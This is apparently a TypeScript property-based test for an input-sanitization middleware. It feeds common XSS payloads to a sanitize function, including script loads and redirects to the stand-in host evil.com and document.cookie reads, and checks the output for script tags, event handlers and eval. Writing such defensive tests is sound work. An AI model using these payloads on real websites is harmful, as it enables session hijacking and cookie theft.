/**
 * Property Test: Input Sanitization
 * Built with Google Antigravity & Vertex AI
 *
 * Property 11: For any string with XSS/injection payloads,
 * sanitized output contains no executable script content.
 *
 * **Validates: Requirements 8.7**
 */
import * as fc from 'fast-check';
import { sanitize } from '../../middleware/validationMiddleware';

// ─── Arbitraries ─────────────────────────────────────────────────────────────

/**
 * Generate strings that include common XSS/injection patterns.
 */
const xssPayloadArb = fc.oneof(
  fc.constant('<script>alert("xss")</script>'),
  fc.constant('<img src=x onerror=alert(1)>'),
  fc.constant('<svg onload=alert(1)>'),
  fc.constant('javascript:alert(1)'),
  fc.constant('<a href="javascript:alert(1)">click</a>'),
  fc.constant('<div onmouseover="alert(1)">hover</div>'),
  fc.constant('"><script>document.cookie</script>'),
  fc.constant("'><script>document.write('xss')</script>"),
  fc.constant('<iframe src="data:text/html,<script>alert(1)</script>">'),
  fc.constant('<body onload=alert(1)>'),
  fc.constant('expression(alert(1))'),
  fc.constant('eval("alert(1)")'),
  fc.constant('vbscript:alert(1)'),
  fc.constant('<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>'),
  fc.constant('window.location="http://evil.com"'),
);

const mixedInputArb = fc.tuple(
  fc.string({ minLength: 0, maxLength: 50 }),
  xssPayloadArb,
  fc.string({ minLength: 0, maxLength: 50 })
).map(([prefix, payload, suffix]) => `${prefix}${payload}${suffix}`);

// ─── Property Tests ──────────────────────────────────────────────────────────

describe('Property 11: Input sanitization', () => {
  it('sanitized output contains no script tags', () => {
    fc.assert(
      fc.property(mixedInputArb, (input) => {
        const result = sanitize(input);
        expect(result.toLowerCase()).not.toMatch(/<\s*script/i);
        expect(result.toLowerCase()).not.toMatch(/<\s*\/\s*script/i);
      }),
      { numRuns: 100 }
    );
  });

  it('sanitized output contains no event handlers', () => {
    fc.assert(
      fc.property(mixedInputArb, (input) => {
        const result = sanitize(input);
        expect(result).not.toMatch(/on\w+\s*=/i);
      }),
      { numRuns: 100 }
    );
  });

  it('sanitized output contains no javascript: protocol', () => {
    fc.assert(
      fc.property(mixedInputArb, (input) => {
        const result = sanitize(input);
        expect(result.toLowerCase()).not.toMatch(/javascript\s*:/i);
      }),
      { numRuns: 100 }
    );
  });

  it('sanitized output contains no eval calls', () => {
    fc.assert(
      fc.property(mixedInputArb, (input) => {
        const result = sanitize(input);
        expect(result.toLowerCase()).not.toMatch(/eval\s*\(/i);
      }),
      { numRuns: 100 }
    );
  });

  it('sanitized output contains no document.cookie access', () => {
    fc.assert(
      fc.property(mixedInputArb, (input) => {
        const result = sanitize(input);
        expect(result.toLowerCase()).not.toMatch(/document\s*\.\s*cookie/i);
      }),
      { numRuns: 100 }
    );
  });

  it('sanitize preserves safe text content', () => {
    fc.assert(
      fc.property(
        fc.stringOf(fc.constantFrom(
          ...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,!?-_:;()'.split('')
        ), { minLength: 1, maxLength: 100 }),
        (safeInput) => {
          const result = sanitize(safeInput);
          // Safe alphanumeric input should be preserved (possibly trimmed)
          expect(result).toBe(safeInput.trim());
        }
      ),
      { numRuns: 100 }
    );
  });
});
